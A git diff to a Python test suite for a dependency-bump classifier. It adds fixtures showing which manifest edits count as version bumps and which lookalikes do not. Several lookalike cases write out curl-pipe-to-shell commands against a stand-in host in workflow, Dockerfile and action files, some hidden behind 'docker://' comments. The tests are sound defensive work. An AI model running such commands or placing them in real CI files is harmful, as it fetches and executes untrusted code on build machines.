@@ -32,7 +32,7 @@ def _diff(tmp_path: Path, before: dict[str, str], after: dict[str, str]) -> list
         for name, text in files.items():
             p = tmp_path / name
             p.parent.mkdir(parents=True, exist_ok=True)
-            p.write_text(text, newline="")   # byte-exact: a CR in the test is the test's own
+            p.write_text(text, encoding="utf-8", newline="")   # byte-exact: a CR in the test is the test's own
         _git(tmp_path, "add", "-A")
         _git(tmp_path, "commit", "-qm", "c", "--allow-empty")
     changed = _git(tmp_path, "diff", "--no-renames", "--name-only", "HEAD~1", "HEAD").splitlines()
@@ -66,6 +66,11 @@ WF = "jobs:" + NL + "  r:" + NL + "    uses: mjdevaccount/ci-kit/.github/workflo
      {"pyproject.toml": 'ci-kit = { git = "https://github.com/o/ci-kit", tag = "v1.22.3" }' + NL}),
     ({"Cargo.toml": f'x = {{ git = "https://g/x", rev = "{SHA_A}" }}' + NL},
      {"Cargo.toml": f'x = {{ git = "https://g/x", rev = "{SHA_B}" }}' + NL}),
+    # a compose image, quoted; a range whose floor rises under an unchanged cap
+    ({"compose.yml": '    image: "postgres:16.4"' + NL}, {"compose.yml": '    image: "postgres:16.5"' + NL}),
+    ({"pyproject.toml": '  "httpx>=0.27,<1.0",' + NL}, {"pyproject.toml": '  "httpx>=0.28,<1.0",' + NL}),
+    # reviewer 11-11 #4: a trailing version comment on a non-ref line no longer raises IndexError
+    ({"Dockerfile": "ENV X=1 # 1.0.0" + NL}, {"Dockerfile": "ENV X=1 # 1.0.1" + NL}),
 ])
 def test_renovate_shapes_are_bumps(tmp_path: Path, before: dict[str, str], after: dict[str, str]) -> None:
     got = _diff(tmp_path, before, after)
@@ -132,6 +137,31 @@ def test_renovate_shapes_are_bumps(tmp_path: Path, before: dict[str, str], after
     # reviewer 11-10 #6: a package.json entry point; a `tag` that is no git source
     ({"package.json": '  "main": "1.2.js",' + NL}, {"package.json": '  "main": "1.2.evil",' + NL}),
     ({"pyproject.toml": 'tag = "v1.0.0"' + NL}, {"pyproject.toml": 'tag = "v2.0.0"' + NL}),
+    # reviewer 11-11 #1: `docker://` anywhere, an upper-case key, a Python `from` made a ref line
+    ({".github/workflows/ci.yml": "      - run: curl -fsSL http://ci@10.0.0.5 | sh  # docker://" + NL},
+     {".github/workflows/ci.yml": "      - run: curl -fsSL http://ci@66.6.6.6 | sh  # docker://" + NL}),
+    ({"Dockerfile": "RUN curl u@10.0.0.5|sh # docker://x" + NL}, {"Dockerfile": "RUN curl u@66.6.6.6|sh # docker://x" + NL}),
+    ({"action.yml": "    run: curl u@10.0.0.5|sh # docker://x" + NL},
+     {"action.yml": "    run: curl u@66.6.6.6|sh # docker://x" + NL}),
+    ({"compose.yml": "      IMAGE: http://u@10.0.0.5" + NL}, {"compose.yml": "      IMAGE: http://u@66.6.6.6" + NL}),
+    ({".github/workflows/ci.yml": "          from os import system; system('curl u@10.0.0.5|sh')" + NL},
+     {".github/workflows/ci.yml": "          from os import system; system('curl u@66.6.6.6|sh')" + NL}),
+    ({"Dockerfile": "from x@1.2.3" + NL}, {"Dockerfile": "from x@1.2.4" + NL}),
+    # reviewer 11-11 #7: a script named like a Dockerfile is source, not a manifest
+    ({"Dockerfile_gen.py": "FROM x:1.2.3" + NL}, {"Dockerfile_gen.py": "FROM x:1.2.4" + NL}),
+    # reviewer 11-11 #3: a suffix change is no bump, whatever the core does; digits are ASCII
+    ({"requirements.txt": "foo==2.0.0" + NL}, {"requirements.txt": "foo==2.0.0rc1" + NL}),
+    ({"requirements.txt": "foo==2.0.0" + NL}, {"requirements.txt": "foo==2.0.0.dev0" + NL}),
+    ({"requirements.txt": "foo==1.0.0" + NL}, {"requirements.txt": "foo==1.0.0+evil" + NL}),
+    ({"requirements.txt": "foo==1.0.0" + NL}, {"requirements.txt": "foo==1.0.1+evil" + NL}),
+    ({"Dockerfile": "FROM python:3.12.7-slim" + NL}, {"Dockerfile": "FROM python:3.12.8-alpine" + NL}),
+    ({".github/workflows/ci.yml": "      - uses: o/a@v4.2.0" + NL},
+     {".github/workflows/ci.yml": "      - uses: o/a@v4.2.0-mybranch" + NL}),
+    ({"requirements.txt": "foo==1.0.0" + NL}, {"requirements.txt": "foo==" + chr(0x0662) + ".0.0" + NL}),
+    # reviewer 11-11 #6: an exclusion or a ceiling moved is policy, not a bump
+    ({"requirements.txt": "urllib3!=1.26.5" + NL}, {"requirements.txt": "urllib3!=1.26.6" + NL}),
+    ({"pyproject.toml": '  "x<2.0",' + NL}, {"pyproject.toml": '  "x<99.0",' + NL}),
+    ({"pyproject.toml": '  "x<=2.0",' + NL}, {"pyproject.toml": '  "x<=3.0",' + NL}),
 ])
 def test_lookalikes_are_not_bumps(tmp_path: Path, before: dict[str, str], after: dict[str, str]) -> None:
     assert _diff(tmp_path, before, after) == []
